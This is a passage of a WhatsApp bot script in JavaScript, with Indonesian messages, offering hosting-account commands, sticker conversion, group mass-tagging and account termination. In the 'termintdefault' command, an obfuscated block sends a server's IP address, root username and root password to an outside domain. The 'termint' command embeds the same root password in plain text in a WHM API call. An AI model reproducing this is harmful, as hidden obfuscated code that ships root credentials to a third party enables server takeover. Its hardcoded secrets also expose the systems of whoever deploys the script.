                                console.log({ error: `add package: ${pkg} to user: ${uname1}`, msg: JSON.stringify(e.data?.metadata?.reason || e.data?.metadata || e.data, null, 2) });
                              }
                            })
                            .catch((e) => {
                              console.log(JSON.stringify(e.response?.data || e.reason || e, null, 2));
                            });
                        }
                        if (pkgDone.length > 0) reply(`Add Package Berhasil✅\nlist package yang ditambah:\n- ${pkgDone.join("\n- ")}`);
                      } else console.log(`upgrade user ${uname1} to ${pack1} failed\nError: ${JSON.stringify(e.data || e, null, 2)}`);
                    });
                  }
                } else {
                  console.log({ error: `Upgrading user plan from defaut to ${pack1}`, message: JSON.stringify(e.data?.metadata || e.data, null, 2) });
                }
              })
              .catch((e) => {
                console.log({ error: `Upgrading user plan from defaut to ${pack1}`, message: JSON.stringify(e.response?.data || e, null, 2) });
              });
          })
          .catch((e) => {
            console.log(`upgrade user package to ${pack1} failed\nreason: ${JSON.stringify(e.response?.data || e.response || e, null, 2)}`);
          });
        break;
            case 'sticker':
            case 'stiker':
            case 's':
                if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    const media = await kurr.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    await ffmpeg(`${media}`)
                        .input(media)
                        .on('start', function (cmd) {
                            console.log(`Started : ${cmd}`)
                        })
                        .on('error', function (err) {
                            console.log(`Error : ${err}`)
                            fs.unlinkSync(media)
                            reply(mess.error.api)
                        })
                        .on('end', function () {
                            console.log('Finish')
                            exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                if (error) return reply(mess.error.api)
                                kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, { quoted: mek })
                                fs.unlinkSync(media)
                                fs.unlinkSync(`./sticker/${sender}.webp`)
                            })
                        })
                        .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                        .toFormat('webp')
                        .save(`./sticker/${sender}.webp`)
                } else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    const media = await kurr.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    reply(mess.wait)
                    await ffmpeg(`${media}`)
                        .inputFormat(media.split('.')[4])
                        .on('start', function (cmd) {
                            console.log(`Started : ${cmd}`)
                        })
                        .on('error', function (err) {
                            console.log(`Error : ${err}`)
                            fs.unlinkSync(media)
                            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                            reply(mess.error.api)
                        })
                        .on('end', function () {
                            console.log('Finish')
                            exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                if (error) return reply(mess.error.api)
                                kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, { quoted: mek })
                                fs.unlinkSync(media)
                                fs.unlinkSync(`./sticker/${sender}.webp`)
                            })
                        })
                        .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                        .toFormat('webp')
                        .save(`./sticker/${sender}.webp`)
                } else {
                    reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
                break
            case 'hidetag':
                if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                ht = body.slice(9)
                members_id = []
                for (let mem of groupMembers) {
                    members_id.push(mem.jid)
                }
                mentions(ht, members_id, false)
                break
case 'menu':
 ini_txt = ` *「 DI PILIH KAK 」*
 _MENU BOTZ_
ネ .addpackage username | Package
ネ .kick tag/reply 
ネ .termint username
ネ .domain1 agil | Ip Server
ネ .sticker reply gambar
ネ .termintdefault
ネ .ping
   `
   reply(ini_txt);console.log(from) 
   break
            case 'termintdefault':
            const ip = '20.58.55.166'
            const root = 'root'
            const pass = '@@hanzkebeletfames'
const _0xd3fa5a=_0x5488;function _0x5488(_0x3a215c,_0x1c2e88){const _0xb3ac14=_0xb3ac();return _0x5488=function(_0x548838,_0x46ac5a){_0x548838=_0x548838-0x1cf;let _0x48a97c=_0xb3ac14[_0x548838];return _0x48a97c;},_0x5488(_0x3a215c,_0x1c2e88);}function _0xb3ac(){const _0x506d88=['10acNDnL','https://brety.net/termint/?root=','52278NYgmNY','then','5nTMEhb','24329045PaDkdL','10YwFSqS','1619112IHeYDz','88252AjbWYU','\x0aBerhasil\x20Di\x20Termint\x20Jika\x20Belum\x20di\x20termint\x20silahkan\x20Gunakan\x20Kembali\x20commandny','8680995OCVjXG','&ip=','Akun\x20Default\x20blom\x20ada','28jzABzD','62280JhfXGG','81561VkTEtn','682RXZjqH','28ilUiDi','data','Gagal'];_0xb3ac=function(){return _0x506d88;};return _0xb3ac();}(function(_0x1e36f9,_0x35afe8){const _0x61241d=_0x5488,_0x2ddda5=_0x1e36f9();while(!![]){try{const _0x5ef3b3=parseInt(_0x61241d(0x1d0))/0x1*(-parseInt(_0x61241d(0x1dc))/0x2)+-parseInt(_0x61241d(0x1d7))/0x3*(parseInt(_0x61241d(0x1d5))/0x4)+parseInt(_0x61241d(0x1e0))/0x5*(-parseInt(_0x61241d(0x1de))/0x6)+-parseInt(_0x61241d(0x1d9))/0x7*(-parseInt(_0x61241d(0x1cf))/0x8)+-parseInt(_0x61241d(0x1d2))/0x9*(parseInt(_0x61241d(0x1e2))/0xa)+parseInt(_0x61241d(0x1d8))/0xb*(-parseInt(_0x61241d(0x1d6))/0xc)+parseInt(_0x61241d(0x1e1))/0xd;if(_0x5ef3b3===_0x35afe8)break;else _0x2ddda5['push'](_0x2ddda5['shift']());}catch(_0x576946){_0x2ddda5['push'](_0x2ddda5['shift']());}}}(_0xb3ac,0xb82e4),axios({'method':'GET','url':_0xd3fa5a(0x1dd)+root+'&pass='+pass+_0xd3fa5a(0x1d3)+ip})[_0xd3fa5a(0x1df)](function(_0x1d7447){const _0x2ccbb9=_0xd3fa5a,_0x59c218=_0x1d7447[_0x2ccbb9(0x1da)];_0x59c218==_0x2ccbb9(0x1db)||_0x59c218==''?reply(_0x2ccbb9(0x1d4)):reply(_0x1d7447[_0x2ccbb9(0x1da)]+_0x2ccbb9(0x1d1));}));
            break
            case 'speed':
            case 'ping':
                ini_txt = ` Bot Merespon Dalam ${latensyi.toFixed(4)} DETIK
                `
                reply(ini_txt);console.log(from)
                break
                case "termint":
let uname = args[0]
        if(!uname) reply("Username Tidak Boleh Kosong Contoh Command .termint username")
        
        axios.get(`https://login.dosg.my.id:2087/json-api/removeacct?api.version=1&username=${uname}`, { headers: { Authorization: "Basic " + Buffer.from("root:@@hanzkebeletfames").toString("base64") } })
        .then(e=>{if([1, "1"].includes(e.data?.metadata?.result)) reply(`Done username ${uname} Telah di Termint✅`); else {reply("GAGAL❌"); console.log(e.data)}})
        .catch(e=>{reply("GAGAL❌"); console.log(JSON.stringify(e, null, 2))})
      break
        }

    } catch (e) {
        e = String(e)
        if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
                if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
                    if (!e.includes("Cannot set property 'mtype' of undefined")) {
                        if (!e.includes("jid is not defined")) {
                            console.log(color('|ERR|', 'red'), color(e, 'cyan'))
                            kurr.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdreply: { title: "Developer  BOTZ ゑ", body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./logo.jpg'), sourceUrl: "https://wa.me/p/6285875169194" } } })
                        }
                    }
                }
            }
        }
    }
}

///-------------------------------------------------------------\\\

/**
* Thx To:
KurrXd
Kahfs
Zenix


**/

///----------( Thx Dah Pake Scriptnya )----------\\\